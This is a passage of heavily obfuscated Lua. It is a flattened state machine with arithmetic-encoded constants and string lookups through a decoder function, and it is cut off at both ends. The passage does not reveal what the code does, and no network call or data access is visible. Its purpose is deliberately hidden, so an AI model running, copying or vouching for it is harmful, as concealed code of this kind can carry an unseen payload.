oK=L[q]LK=oK(QK,vK)nK=TK[LK]TK=V(14911766-(-151335),{l;q,y;c,t,r,w})U={[h]=S,[CK]=pK,[mK]=dK,[WK]=XK,[nK]=TK}i=i(A,U)dK=-885663+11755979135233 mK=p(-636924+679046)U=v()nK=32164785677923-994274 XK=-200835+9292282831210 LK=-363684+6757611034862 L[U]=i S=L[l]CK=L[q]i=p(-215292-(-257302))lK=481833+31231652470438 pK=CK(mK,dK)i=A[i]h=S[pK]WK=p(-243799+285936)i=i(A,h)vK=27747574780778-975090 qK=p(-442230+484281)pK=L[l]mK=L[q]dK=mK(WK,XK)CK=pK[dK]XK=p(-520731-(-562945))mK=L[l]dK=L[q]WK=dK(XK,nK)pK=mK[WK]oK=23975823991458-(-772346)h=p(626957-584693)TK=27322907435503-749628 nK=p(714468+-672360)dK=L[l]h=A[h]WK=L[q]XK=WK(nK,TK)mK=dK[XK]WK=p(-546820-(-588882))TK=31366440143729-578147 nK=23814320485043-(-227486)XK=13269373183604-(-668079)dK=s(-339887+2825144,{M,t;l;q;U})S={[CK]=pK,[mK]=dK}h=h(A,S)pK=L[l]mK=L[q]dK=mK(WK,XK)CK=pK[dK]mK=L[l]XK=p(-546852+588920)dK=L[q]WK=dK(XK,nK)pK=mK[WK]nK=p(-73837+115832)dK=L[l]WK=L[q]QK=-488550+5931306270511 XK=WK(nK,TK)mK=dK[XK]TK=p(969447+-927382)WK=L[l]XK=L[q]nK=XK(TK,oK)oK=p(551542-509555)dK=WK[nK]XK=L[l]nK=L[q]TK=nK(oK,LK)LK=p(-777991-(-820055))WK=XK[TK]nK=L[l]TK=L[q]oK=TK(LK,QK)XK=nK[oK]TK=L[l]oK=L[q]QK=p(1042978+-1001006)h=p(827436+-785414)LK=oK(QK,vK)yK=-105603+18718108745359 nK=TK[LK]LK=L[l]QK=L[q]vK=QK(qK,NK)oK=LK[vK]QK=L[l]NK=p(-65431+107635)vK=L[q]TK=false h=A[h]qK=vK(NK,lK)lK=p(241649+-199378)LK=QK[qK]vK=L[l]qK=L[q]NK=qK(lK,zK)QK=vK[NK]vK=I(-533000+6551485,{G})S={[CK]=pK;[mK]=dK,[WK]=XK;[nK]=TK,[oK]=LK,[QK]=vK}h=h(A,S)QK=-902594+7846875059207 nK=-355730+13619610224216 pK=L[l]XK=16230301981571-966142 mK=L[q]WK=p(-620424+662447)dK=mK(WK,XK)CK=pK[dK]h=p(602723-560459)mK=L[l]dK=L[q]XK=p(565077-522866)WK=dK(XK,nK)TK=-610527+22899834468998 pK=mK[WK]dK=L[l]nK=p(939711+-897710)WK=L[q]XK=WK(nK,TK)h=A[h]mK=dK[XK]WK=p(795669-753423)XK=-334408+18409238363076 dK=s(4031189-(-571960),{t,l;q,G;u;c;r,B})S={[CK]=pK,[mK]=dK}h=h(A,S)pK=L[l]vK=492814+3126544318625 mK=L[q]dK=mK(WK,XK)CK=pK[dK]nK=8235735792959-(-496060)TK=7813559648849-(-707557)mK=L[l]XK=p(315532+-273363)dK=L[q]WK=dK(XK,nK)nK=p(216181-174165)pK=mK[WK]dK=L[l]WK=L[q]XK=WK(nK,TK)h=p(778526+-736262)mK=dK[XK]XK=7157786569459-(-270866)NK=1781815704834-637381 dK=I(691690+8990447,{t,l,q,y;B,c;r})S={[CK]=pK;[mK]=dK}WK=p(866954-824974)h=A[h]h=h(A,S)pK=L[l]TK=1013170898695-(-670416)mK=L[q]h=p(518184+-475920)dK=mK(WK,XK)CK=pK[dK]XK=p(436336-394127)mK=L[l]dK=L[q]nK=-376651+12459315254772 WK=dK(XK,nK)pK=mK[WK]nK=p(914437-872260)dK=L[l]WK=L[q]XK=WK(nK,TK)h=A[h]LK=9218613189087-(-177893)nK=-689027+1089264174462 mK=dK[XK]dK=J(559638+2676779,{c;r})S={[CK]=pK,[mK]=dK}h=h(A,S)XK=20427160264121-(-444271)pK=L[l]mK=L[q]WK=p(-991734-(-1034014))dK=mK(WK,XK)qK=p(-428297+470366)CK=pK[dK]oK=p(-231354-(-273384))XK=p(-976675-(-1018893))mK=L[l]dK=L[q]TK=-47386+32379611182079 WK=dK(XK,nK)nK=p(523595-481435)pK=mK[WK]dK=L[l]WK=L[q]XK=WK(nK,TK)mK=dK[XK]XK=L[l]nK=L[q]dK={}TK=nK(oK,LK)WK=XK[TK]LK=p(-928030-(-970084))nK=L[l]TK=L[q]oK=TK(LK,QK)XK=nK[oK]TK=L[l]oK=L[q]QK=p(522607-480359)LK=oK(QK,vK)nK=TK[LK]TK=false LK=L[l]QK=L[q]vK=QK(qK,NK)oK=LK[vK]LK=s(-436201+16905808,{l,q,y;x;r,j;Y})h=p(-101881+143889)S={[CK]=pK,[mK]=dK,[WK]=XK;[nK]=TK;[oK]=LK}oK=576779+32063675444551 h=O[h]h=h(O,S)S=v()L[S]=h lK=p(-158709+200928)pK=L[l]XK=-1018775+13770280641699 WK=p(505575-463554)mK=L[q]TK=-518134+26368010704876 dK=mK(WK,XK)h=p(-716945+758955)CK=pK[dK]h=O[h]m=17192613-702281 h=h(O,CK)LK=32179518214229-562637 dK=L[l]WK=L[q]nK=p(-897639-(-939622))XK=WK(nK,TK)mK=dK[XK]WK=L[l]TK=p(938582+-896395)XK=L[q]nK=XK(TK,oK)oK=p(-347160-(-389179))dK=WK[nK]XK=L[l]nK=L[q]CK=p(-984195-(-1026459))TK=nK(oK,LK)WK=XK[TK]CK=O[CK]TK=258419853909-313821 oK=22011309862490-476753 XK=J(1036955+12507493,{r,l;q,S})vK=802208+31140032756484 LK=25410562552221-17253 pK={[mK]=dK;[WK]=XK}CK=CK(O,pK)dK=L[l]nK=p(-142273-(-184428))WK=L[q]IK=13566900629200-(-174557)XK=WK(nK,TK)zK=9725941080977-4577 mK=dK[XK]WK=L[l]XK=L[q]TK=p(607863+-565634)nK=XK(TK,oK)dK=WK[nK]XK=L[l]oK=p(-377184+419226)nK=L[q]TK=nK(oK,LK)CK=p(59039-16775)WK=XK[TK]NK=-746109+16687597633751 TK=897926+7924300372708 nK=p(-432219+474392)XK=s(3591942-197731,{r;x,l,q,S})CK=O[CK]pK={[mK]=dK,[WK]=XK}CK=CK(O,pK)dK=L[l]WK=L[q]XK=WK(nK,TK)mK=dK[XK]WK=L[l]TK=p(-65308-(-107380))XK=L[q]oK=22435458414918-(-241545)nK=XK(TK,oK)dK=WK[nK]XK=L[l]LK=-989549+31170470793759 oK=p(1052+41206)nK=L[q]CK=p(974786+-932522)TK=nK(oK,LK)WK=XK[TK]CK=O[CK]LK=218529+21226517696763 qK=909070+27534469632775 XK=Z(1800755-(-507501),{l,q,r;Y;j,B})TK=295947+23557813167822 nK=p(538797-496736)pK={[mK]=dK,[WK]=XK}CK=CK(O,pK)dK=L[l]WK=L[q]XK=WK(nK,TK)mK=dK[XK]oK=785241+13813995265479 WK=L[l]TK=p(-206400-(-248675))XK=L[q]nK=XK(TK,oK)dK=WK[nK]oK=p(218877-176817)XK=L[l]CK=p(-824142-(-866164))nK=L[q]TK=nK(oK,LK)WK=XK[TK]QK=16152412524377-(-445960)LK=p(-994855+1036970)nK=L[l]TK=L[q]oK=TK(LK,QK)XK=nK[oK]TK=L[l]oK=L[q]QK=p(-73805-(-115924))LK=oK(QK,vK)nK=TK[LK]vK=p(90507-48367)oK=L[l]LK=L[q]QK=LK(vK,qK)qK=p(-139886-(-181935))TK=oK[QK]LK=L[l]QK=L[q]vK=QK(qK,NK)oK=LK[vK]LK=true vK=L[l]qK=L[q]NK=qK(lK,zK)zK=p(842528+-800285)QK=vK[NK]qK=L[l]NK=L[q]lK=NK(zK,yK)CK=O[CK]vK=qK[lK]yK=p(-497064-(-539223))NK=L[l]lK=L[q]zK=lK(yK,IK)qK=NK[zK]NK=s(13663942-(-71719),{l;q;Y})pK={[mK]=dK,[WK]=XK,[nK]=TK,[oK]=LK;[QK]=vK;[qK]=NK}TK=18259764949552-(-126726)nK=p(-534143+576321)CK=CK(O,pK)dK=L[l]WK=L[q]XK=WK(nK,TK)TK=p(-238277+280274)zK=9508264103683-(-426568)mK=dK[XK]oK=-514979+6979506694229 WK=L[l]LK=4964420257082-(-50125)NK=140999+16410256635666 XK=L[q]nK=XK(TK,oK)dK=WK[nK]oK=p(-836841+878891)XK=L[l]nK=L[q]TK=nK(oK,LK)lK=p(846595-804389)QK=8485955104991-(-401040)qK=894294+23675574339002 WK=XK[TK]LK=p(228767+-186652)nK=L[l]TK=L[q]oK=TK(LK,QK)QK=p(-145740-(-187751))vK=22257177915255-(-63749)XK=nK[oK]TK=L[l]oK=L[q]LK=oK(QK,vK)nK=TK[LK]oK=L[l]LK=L[q]vK=p(-469843+512059)QK=LK(vK,qK)TK=oK[QK]qK=p(630860-588616)LK=L[l]QK=L[q]vK=QK(qK,NK)oK=LK[vK]LK=true yK=19661673217956-269281 vK=L[l]qK=L[q]NK=qK(lK,zK)IK=25347730121686-488891 QK=vK[NK]qK=L[l]zK=p(63314+-21058)NK=L[q]lK=NK(zK,yK)yK=p(-242374+284454)vK=qK[lK]NK=L[l]CK=p(402164-360142)lK=L[q]zK=lK(yK,IK)qK=NK[zK]NK=g(14176330-797601,{l;q,j})CK=O[CK]pK={[mK]=dK;[WK]=XK;[nK]=TK,[oK]=LK,[QK]=vK;[qK]=NK}nK=p(-220070+262034)CK=CK(O,pK)TK=31480441490712-(-11307)dK=L[l]WK=L[q]XK=WK(nK,TK)TK=p(-852744+894935)mK=dK[XK]oK=34083372554026-121131 WK=L[l]QK=p(-971691-(-1013691))vK=647116+5555325446734 XK=L[q]nK=XK(TK,oK)LK=21659269955099-464566 dK=WK[nK]oK=p(635764+-593761)XK=L[l]CK=p(870924+-828826)nK=L[q]TK=nK(oK,LK)WK=XK[TK]TK=L[l]oK=L[q]CK=H[CK]XK=false LK=oK(QK,vK)nK=TK[LK]TK=J(-450699+1608707,{l,q,r})pK={[mK]=dK;[WK]=XK;[nK]=TK}TK=-131088+10381100339954 CK=CK(H,pK)dK=L[l]oK=-106717+17160014348307 WK=L[q]nK=p(-909142+951313)CK=p(440587+-398323)XK=WK(nK,TK)mK=dK[XK]TK=p(-1036276+1078469)CK=H[CK]WK=L[l]XK=L[q]nK=XK(TK,oK)oK=p(-762364-(-804468))dK=WK[nK]XK=L[l]LK=33576125849925-(-678862)nK=L[q]TK=nK(oK,LK)WK=XK[TK]XK=Z(16242301-(-213803),{l;q})pK={[mK]=dK;[WK]=XK}CK=CK(H,pK)end else if m<5196560-326058 then if m<956100+3866199 then K=-303351-(-303352)B=#Y j=N(K,B)E=-644170-(-644171)K=x(Y,j)B=L[u]j=nil k=K-E m=864153-797508 P=c(k)B[K]=P K=nil else o=R m=f m=-208091+4317973 end else r=G e=p(-837723+879850)b=C[e]e=p(694945+-652888)a=b[e]b=a(Q,r)a=L[X[968304-968298]]e=a()K=b+e j=K+x K=-126457-(-126713)Y=j%K r=nil e=156354+-156353 x=Y K=N[q]b=x+e m=12376154-(-43842)a=l[b]j=K..a N[q]=j end end else if m<443681+4715015 then if m<-522457+5662918 then if m<-511840+5434977 then m=500325+9778011 else m=Q L[X[170733+-170730]]=m x=p(821993-779864)j=p(-117721-(-159821))m=C[p(-584676-(-626797))]N=L[X[-231276-(-231280)]]y=C[x]r=L[X[-205419-(-205424)]]K=14356199698793-972620 t=L[X[-224702-(-224703)]]u=L[X[-726264-(-726266)]]Y=u(j,K)o={}G=t[Y]t=L[X[938318+-938315]]M=G..t u=12904137856264-(-49776)c=r..M x={y(c)}l=p(-115691+157808)l=N[l]l=l(N,d(x))L[X[430495+-430489]]=l t=p(188556-146483)N=L[X[-1004257-(-1004264)]]r=L[X[-117485-(-117486)]]M=L[X[-419847-(-419849)]]Q=nil G=M(t,u)c=r[G]r=L[X[-918159+918162]]x=c..r y=p(-989080+1031204)y=N[y]y=y(N,x)end else t=nil q=z(q)G=z(G)Y=nil N=z(N)x=nil G=v()x=p(-580582+622784)u=nil r=nil y=z(y)q=nil m=951290+5183471 j=nil K=z(K)l=z(l)M=z(M)l=v()M=p(517168+-475041)c=z(c)K=833206+-832950 Y={}N=nil L[l]=q q=v()L[q]=N y=C[x]x=p(76787-34700)N=y[x]y=v()c=p(858480+-816278)L[y]=N r=p(-357992-(-400181))x=C[c]c=p(1062910-1020759)N=x[c]j=717963+-717962 c=C[r]r=p(142807-100653)x=c[r]t={}r=C[M]M=p(-53064+95300)c=r[M]r=-255052+255052 u=v()B=K M=v()L[M]=r r=742372+-742370 L[G]=r K=-1029440-(-1029441)L[u]=t t=-805054+805054 r={}P=K K=465172-465172 k=P<K K=j-P end else if m<-844911+6073502 then m=B m=K and 3566439-714863 or 4960064-221987 else m=C[p(939098-897106)]o={q}end end end else if m<-632940+6455576 then if m<6221145-651489 then if m<471051+4951461 then if m<5621633-263329 then m=1442041-825051 H=nil O=nil else y=nil m=563674+5525271 l=nil end else QK=p(464677+-422703)CK=p(161371-119247)TK=4371803073803-353560 dK=L[l]lK=p(-330045-(-372016))WK=L[q]nK=p(-141147-(-183145))yK=p(-904004-(-946169))XK=WK(nK,TK)nK=p(-247130+289277)mK=dK[XK]zK=724165513533-1036268 vK=224987+34658390904880 XK=C[nK]TK=L[l]oK=L[q]LK=oK(QK,vK)m=-406669+16897001 nK=TK[LK]WK=XK[nK]TK=L[l]QK=p(-263689+305909)vK=1041403+12042440143340 oK=L[q]LK=oK(QK,vK)nK=TK[LK]oK=L[Y]IK=28710262790965-(-628996)vK=L[l]qK=L[q]NK=qK(lK,zK)QK=vK[NK]NK=L[l]lK=L[q]zK=lK(yK,IK)qK=NK[zK]CK=D[CK]NK=L[j]vK=qK..NK LK=QK..vK TK=oK..LK XK=nK..TK dK=WK..XK pK=mK..dK dK=L[l]TK=-904609+12291491013628 WK=L[q]nK=p(-545934+588016)XK=WK(nK,TK)mK=dK[XK]CK=CK(D,pK,mK)end else if m<6764881-1024196 then if m<4854690-(-846231)then m=8362818-393097 y=nil x=nil else y=p(-769649-(-811651))r=-825652+20717699088099 m=L[X[-251097-(-251102)]]q=L[X[188211-188209]]x=369077+22591934646115 N=L[X[627693+-627690]]c=p(1054650-1012595)l=N(y,x)Q=q[l]l=L[X[-394781-(-394783)]]y=L[X[37922-37919]]x=y(c,r)N=l[x]l=L[X[-131398-(-131402)]]q=N..l N=588295-588290 o=m(Q,q,N)o=p(760646-718588)m=C[o]M=-999740+15019253259405 r=p(-915398+957608)q=L[X[723974+-723973]]y=L[X[-729870-(-729872)]]x=L[X[891802+-891799]]c=x(r,M)l=y[c]y=L[X[680636-680632]]N=l..y Q=q..N q=L[X[-838999-(-839005)]]l=L[X[-136597-(-136604)]]y=p(29435-(-12830))y=q[y]N={y(q,l)}o=m(Q,d(N))m=241468+12459284 end else o=L[X[-726139+726147]]N=L[X[64153-64151]]c=-102372+20060057662561 m=195055+12121948 x=p(-133063-(-175285))l=L[X[-857180-(-857183)]]y=l(x,c)q=N[y]c=p(651474+-609335)l=L[X[-598048-(-598050)]]r=31528492460977-356952 y=L[X[-888720+888723]]x=y(c,r)N=l[x]l=527152-527147 Q=o(q,N,l)end end else if m<5993493-(-31601)then if m<678980+5304636 then if m<319648+5646832 then u=22103531395517-1028489 t=p(-719872-(-761961))r=L[X[-460829-(-460830)]]M=L[X[989264-989262]]G=M(t,u)c=r[G]m=x[c]G=p(644163-602188)G=m[G]G={G(m)}m=81099+4276287 r=G[-1033228-(-1033230)]c=G[-160278-(-160279)]M=G[913124+-913121]else l=nil y=nil m=5654198-(-434747)end else Q=W[-206574-(-206575)]m=Q Q=nil L[X[708950-708949]]=m o={}m=C[p(-387816+429979)]end else if m<-740521+6791459 then R=11098762402205-1033581 A=L[X[-360462-(-360463)]]O=L[X[-424310+424312]]D=p(96072+-53947)H=O(D,R)E=A[H]R=124883+17173655828330 k=b[E]A=L[X[997640+-997639]]O=L[X[696383-696381]]D=p(-193818-(-235964))H=O(D,R)m=-11101+9630504 E=A[H]P=k==E B=P else q,y=N(Q,q)m=q and 12079290-(-438762)or-459400+4623216 end end end end else if m<7079092-(-64291)then if m<837211+6008781 then if m<786665+5440524 then if m<535121+5676204 then if m<-736605+6860057 then m=11186730-482592 else K=K+P j=K<=B E=not k j=E and j E=K>=B E=k and E j=E or j E=16546289-1042789 m=j and E j=8295406-144061 m=m or j end else P=not B a=a+e o=a<=b o=P and o P=a>=b P=B and P o=P or o P=2889653-36485 m=o and P o=-204597+13019085 m=m or o end else if m<5801322-(-618812)then if m<5816703-(-449199)then r=p(164240-122184)l=p(263840+-221610)N=C[l]y=L[X[426734-426733]]M=-901812+13988409367589 x=L[X[-230435+230437]]c=x(r,M)l=y[c]q=N[l]r=-424601+5951117821292 c=p(-922148+964343)l=L[X[948415-948414]]y=L[X[891632+-891630]]x=y(c,r)N=l[x]c=19134043863635-(-829562)o=q[N]N=L[X[586205-586204]]x=p(724620+-682595)l=L[X[-957121+957123]]y=l(x,c)l=p(-934842-(-976817))q=N[y]m=o[q]l=m[l]l={l(m)}N=l[-821958-(-821961)]o=l[439766+-439765]q=l[9758+-9756]m=8749047-779326 l=o else o=L[X[-260197+260202]]Q=p(48510-6404)Q=o[Q]q=L[X[524425+-524424]]m=C[p(-948032+990115)]Q=Q(o,q)o={}end else o=M m=G m=M and-376056+9106961 or 6683267-(-325214)end end else if m<7031516-60722 then if m<7782023-826335 then if m<7899467-973815 then q=p(-792606-(-834848))c=p(199810+-157549)m=C[q]r=11469441264112-906516 l=L[X[-316275+316276]]y=L[X[540675-540673]]x=y(c,r)N=l[x]q=m(N)c=p(499399-457411)r=20038407594483-(-475776)N=p(816352+-774163)q=C[N]l=L[X[-584660-(-584661)]]y=L[X[-478815-(-478817)]]x=y(c,r)N=l[x]m=q[N]N=L[X[-512486-(-512489)]]q=m(N)m=-231676+5202138 L[X[645222-645219]]=q else o=p(-41261-(-83503))c=34358197803372-23277 m=C[o]x=p(546991+-504835)N=L[X[-302421+302422]]l=L[X[404314+-404312]]y=l(x,c)q=N[y]o=m(q)c=498218+4879137255094 q=p(-211994-(-254183))o=C[q]N=L[X[381894-381893]]x=p(-1014702+1056820)l=L[X[353649-353647]]y=l(x,c)q=N[y]m=o[q]o=m(Q)Q=o m=-487767+15957886 end else m=c x=l c=nil q[x]=m m=-15029+7734449 x=nil end else if m<-589602+7686866 then G=p(161174+-119083)M=C[G]m=-446198+9177103 o=M else G=M j=L[X[969815-969814]]b=p(-355223+397408)e=15089705221214-(-925460)K=L[X[-861353+861355]]a=K(b,e)Y=j[a]u=p(-452897+494976)u=t[u]u=u(t,Y)m=not u m=m and 15006048-(-8910)or 756515-(-202384)end end end else if m<673599+7048934 then if m<7366519-(-286992)then if m<8249819-616311 then if m<6635810-(-842476)then G=870336+2258372574299 m={}N=p(884903+-842776)r=11531103107019-303826 Q=W[996356+-996355]q=m o=C[N]l=L[X[-777760-(-777761)]]M=p(-278521+320599)y=L[X[788127+-788125]]c=p(797383-755184)x=y(c,r)N=l[x]m=o[N]x=L[X[-386913+386914]]c=L[X[-452238-(-452240)]]r=c(M,G)y=x[r]x={m(Q,y)}o=x[288995-288994]l=x[82202+-82199]m=-831495+8550915 y=o N=x[-912360-(-912362)]else y=N u=p(-636189+678448)c=p(872137-830058)M=L[X[-1025907-(-1025908)]]G=L[X[-35761+35763]]Y=30554287263-(-4975)t=G(u,Y)r=M[t]c=x[c]c=c(x,r)m=not c m=m and 17910-(-266189)or 5398045-(-496078)end else q,x=N(l,q)m=q and 483463+617642 or 3272905-706242 end else if m<-1005050+8724189 then if m<554918+7152223 then u=26180519504124-(-493219)q=W[-551235-(-551237)]Q=W[-137644+137645]j=p(-116846-(-158886))l=W[498580-498576]G=p(-731263-(-773444))Y=904204+1434696644240 m=L[X[-318608+318609]]c=L[X[-173221+173223]]r=L[X[513114+-513111]]N=W[698046+-698043]t=-1028540+33257785290298 K=26901941513200-(-771327)M=r(G,t)t=p(404883-362799)x=c[M]r=L[X[-699190-(-699192)]]M=L[X[-359096+359099]]G=M(t,u)c=r[G]M=L[X[39838-39836]]u=p(-801423+843585)G=L[X[-519003+519006]]t=G(u,Y)G=m r=M[t]o=p(-445626+487883)t=452755-452750 M=N or t t=L[X[210372-210370]]u=L[X[743804+-743801]]Y=u(j,K)G=t[Y]N=nil u=m Y=-1033990+4484396448 t=l or Y y={[x]=Q,[c]=q,[r]=M;[G]=t}o=m[o]o=o(m,y)m=C[p(547035-504759)]l=nil o={}Q=nil q=nil else o=p(-3835-(-46100))m=L[X[834642+-834636]]Q={}o=m[o]o=o(m,Q)G=p(549265-507013)Q=o m=Q q=p(79837+-37779)L[X[32045+-32038]]=m o=C[q]l=L[X[-274743+274744]]t=28698888333707-(-838312)c=L[X[825049-825047]]r=L[X[572290+-572287]]M=r(G,t)x=c[M]r=L[X[-1015020+1015024]]M=L[X[237677-237672]]c=r..M y=x..c N=l..y q=o(N,Q)m=270962+12046041 o=L[X[-572519-(-572527)]]l=L[X[-636571+636573]]Q=nil c=p(-969181+1011384)r=7940583671586-(-739151)G=176381+31628614043787 M=p(427441+-385432)y=L[X[-647254+647257]]x=y(c,r)N=l[x]x=L[X[848166-848164]]c=L[X[-57724-(-57727)]]r=c(M,G)y=x[r]x=L[X[-279179+279183]]l=y..x y=404190-404185 q=o(N,l,y)end else l,c=y(N,l)m=l and-220817+7183424 or 5658683-389961 end end else if m<281705+7680512 then if m<7007297-(-944309)then if m<8945559-1043821 then x=31884217832413-186846 m=L[X[653449-653444]]y=p(506076-463826)q=L[X[1043275+-1043273]]c=338676+17698110502205 N=L[X[1042149+-1042146]]l=N(y,x)x=p(248556+-206362)Q=q[l]N=L[X[270717-270715]]l=L[X[-451020-(-451023)]]y=l(x,c)q=N[y]N=-615611+615616 o=m(Q,q,N)m=-419468+13120220 else q=L[X[-432477-(-432480)]]N=38970+-38862 Q=q*N q=720296+-720039 o=Q%q L[X[-894398+894401]]=o m=13535102-(-6581)end else o={}m=C[p(-100745+142912)]end else if m<7870871-(-102526)then N,x=l(q,N)m=N and-778058+8409522 or 204593+7771034 else r=p(824766+-782728)l=p(1011673-969628)M=842748+11604687304991 N=C[l]y=L[X[-314627-(-314628)]]x=L[X[-927096-(-927098)]]c=x(r,M)l=y[c]m=-119423+14021548 q=N[l]l=224319-224318 N=q(l)end end end end end end else if m<11803595-(-840433)then if m<9408912-(-989673)then if m<9709005-478695 then if m<9278365-758766 then if m<7201630-(-1023378)then if m<665341+7469014 then if m<7588297-(-493575)then m=true m=m and 16826094-746744 or 9529109-(-32987)else K=nil b=nil a=nil m=14571733-(-730050)B=nil e=nil P=nil end else B=-198143+198143 K=#Y m=288714+4523296 j=K==B end else if m<8518782-66512 then if m<-640635+8941183 then q=L[X[-206957-(-206959)]]N=L[X[518344+-518341]]Q=q==N o=Q m=-118498+11372158 else f=L[q]m=f and-913767+14319590 or 911364+9762008 R=f end else P=nil B=nil e=nil b=nil m=15200975-(-100808)K=nil a=nil end end else if m<-93959+8981504 then if m<9452630-586455 then if m<-321030+9059541 then t=663131-663066 M=v()L[M]=o m=L[c]G=-883422-(-883425)o=m(G,t)m=-441949-(-441949)t=m m=-286273+286273 G=v()Y=p(408843+-366700)L[G]=o j=s(-295696+10156547,{})u=m o=C[Y]Y={o(j)}m={d(Y)}Y=m o=885517-885515 m=Y[o]o=p(-297942+340058)e=p(-562047-(-604013))j=m m=C[o]K=L[N]b=C[e]e=b(j)b=p(259660-217561)a=K(e,b)K={a()}o=m(d(K))K=v()L[K]=o a=L[G]o=646947-646946 b=a a=607090-607089 e=a a=681825-681825 B=e<a m=6230498-3409 a=o-e else B=p(-924615+966646)K=C[B]m=15445404-874846 P=L[t]B=K(P)end else m=761876+12649120 b=t==u a=b end else if m<9454084-428776 then Q=p(-670719-(-712778))N=-923579-(-923579)m=C[Q]q=L[X[-731023+731031]]Q=m(q,N)m=886449+10370608 else u=p(577073+-535041)l=N c=L[X[56248-56245]]t=15759469610509-272739 r=L[X[-26564-(-26568)]]G=p(608624-566494)o=p(368148+-325991)M=r(G,t)x=c[M]o=y[o]o=o(y,x)r=p(-449988+492177)x=o c=C[r]M=L[X[-42615+42618]]G=L[X[-166517+166521]]Y=76145+18499432740917 t=G(u,Y)r=M[t]o=c[r]l=nil r=L[X[-1034513-(-1034514)]]t=846459-846458 G=x+t t=p(-243480-(-285445))t=y[t]M={t(y,G)}x=nil y=nil c=o(r,d(M))m=13702180-954703 end end end else if m<-369377+10216023 then if m<10326799-702111 then if m<10349072-739911 then if m<-905922+10152545 then i=p(775685-733569)WK=223475+25589045708184 dK=p(-890558+932650)w=C[i]U=p(155556-113440)i=w(B)w=C[U]CK=L[X[-190698+190699]]pK=L[X[-331458-(-331460)]]mK=pK(dK,WK)m=-517058+16571435 S=CK[mK]h=H[S]U=w(h)f=i<=U D=f else m=F(3278077-(-142775),{l})b={m()}o={d(b)}m=C[p(-856440-(-898514))]end else m=B and 7573581-(-910766)or 15381420-(-960015)end else if m<9284072-(-508512)then if m<-264533+9901459 then e=579028+-579027 B=-871603+871609 m=L[c]b=m(e,B)m=p(126510-84420)B=p(-185088-(-227178))C[m]=b e=C[B]B=-569544-(-569546)m=e>B m=m and 10081875-(-761921)or 10921868-(-562134)else r=p(538994-497025)o=p(661865-619861)m=C[o]q=L[X[39354-39353]]y=L[X[327423-327421]]M=3263274927311-933600 x=L[X[826391+-826388]]c=x(r,M)l=y[c]y=L[X[-680917+680921]]N=l..y Q=q..N o=m(Q)m=o and 735572+4995570 or 6933037-(-807153)end else q=L[X[973835+-973832]]t=324424-324411 N=899681-899649 Q=q%N l=L[X[-91087-(-91091)]]c=L[X[808054+-808052]]j=L[X[-340762-(-340765)]]M=447108-447106 Y=j-Q j=-873454-(-873486)u=Y/j G=t-u t=-757836+758092 r=M^G x=c/r y=l(x)l=4295782757-815461 N=y%l r=370237+-370236 y=505229-505227 l=y^Q q=N/l l=L[X[908532-908528]]c=q%r r=4294848643-(-118653)x=c*r y=l(x)l=L[X[952553-952549]]x=l(q)N=y+x y=635329-569793 l=N%y c=73527-7991 q=nil x=N-l M=-282388-(-282644)y=x/c c=-558343-(-558599)x=l%c r=l-x m=10608835-(-1042774)c=r/M M=179475-179219 Q=nil r=y%M G=y-r M=G/t y=nil G={x,c,r;M}l=nil x=nil c=nil r=nil M=nil L[X[-260295+260296]]=G N=nil end end else if m<954269+9224141 then if m<256352+9876847 then if m<-800582+10679334 then N=-831775+11086708 q=p(949425+-907318)Q=q^N o=13844313-623260 m=o-Q Q=m o=p(-913358+955597)m=o/Q o={m}m=C[p(-583062-(-625103))]else U=28500+-28498 i=D[U]U=L[H]w=i==U m=-402179+5237644 R=w end else i=-80285+20564209950468 A=p(811102+-768955)E=C[A]O=L[l]B=m w=p(-193353+235549)H=L[q]D=H(w,i)A=O[D]P=E[A]m=P and-821775+6046387 or 331038+16092880 K=P end else if m<465364+9763361 then A=z(A)D=nil m=-468750+6695839 O=z(O)k=z(k)H=z(H)E=z(E)P=z(P)else m=true m=m and 8789957-(-836302)or 849974+7103709 end end end end else if m<11906597-438785 then if m<819528+10362046 then if m<937860+9748637 then if m<1013002+9642757 then if m<551744+10069489 then j=nil K=nil a=nil m=73683+11253784 else h=p(-981552+1023638)f=p(-638478+680745)pK=218468+17099449944502 S=-842747+22691868673345 R=C[f]w=L[X[837714-837713]]i=L[X[-206901+206903]]U=i(h,S)f=w[U]S=-219924+25145261426897 D=R[f]w=L[X[510674-510673]]i=L[X[-769022-(-769024)]]h=p(-561200-(-603366))U=i(h,S)f=w[U]R=D(f)f=L[X[277416-277415]]h=-552205+35097311014116 U=p(-63438-(-105473))w=L[X[-1047069-(-1047071)]]i=w(U,h)h=427169+7169168246889 D=f[i]f=-7676+7676.25 U=p(250976+-208982)R[D]=f f=L[X[-735720+735721]]w=L[X[-897036-(-897038)]]i=w(U,h)D=f[i]f=811443+-811442 R[D]=f h=15308619307292-572740 CK=p(-32993-(-74960))U=p(552554-510284)f=L[X[36555+-36554]]w=L[X[317450-317448]]i=w(U,h)D=f[i]i=p(-68953-(-111168))w=C[i]U=L[X[572728-572727]]h=L[X[108331-108329]]S=h(CK,pK)i=U[S]h=581425+-581170 m=17450182-955977 f=w[i]i=103494-103406 U=540338-540338 w=f(i,U,h)R[D]=w f=L[X[719070-719069]]h=-515994+23906203339542 U=p(-917172-(-959300))w=L[X[-593038+593040]]i=w(U,h)D=f[i]f=a R[D]=f R=nil end else L[q]=R h=-778726-(-778727)U=L[A]i=U+h w=D[i]f=t+w w=-54728-(-54984)m=f%w i=L[E]t=m w=u+i m=11113150-927402 i=871848+-871592 f=w%i u=f end else if m<11194712-332911 then if m<483395+10341026 then m=C[p(-745552+787765)]Q=nil o={}else P=p(925005+-882942)e=p(-707043+749009)m=C[e]B=C[P]e=m(B)m=p(-143685+185775)C[m]=e m=-171358+5093798 end else o=p(197308-155249)Q=p(965687+-923593)m=C[o]o=m(Q)m=C[p(600672+-558403)]o={}end end else if m<11491083-109742 then if m<-733877+12037101 then if m<301164+10953277 then m=o and 517579+598082 or-185712+2970620 else m={}q=812827+-812826 N=L[X[422691-422682]]Q=m m=2842463-903740 l=N N=-297133-(-297134)y=N N=-376334-(-376334)x=y<N N=q-y end else Y,K=t(u,Y)m=Y and 996055+13874832 or 4262725-(-117435)end else if m<-906921+12363659 then U=-1012062-(-1012063)i=D[U]f=m U=false w=i==U R=w m=w and 10869709-956326 or 1012570+3822895 else P=not b m=P and 545701+9073702 or 6540779-513098 B=P end end end else if m<564810+11720838 then if m<11732775-(-146395)then if m<11905535-320467 then if m<11073456-(-405382)then x=L[y]o=x m=91226+4169230 else B=p(180852+-138762)m=C[B]B=p(-442716-(-484779))C[B]=m m=5483239-560799 end else 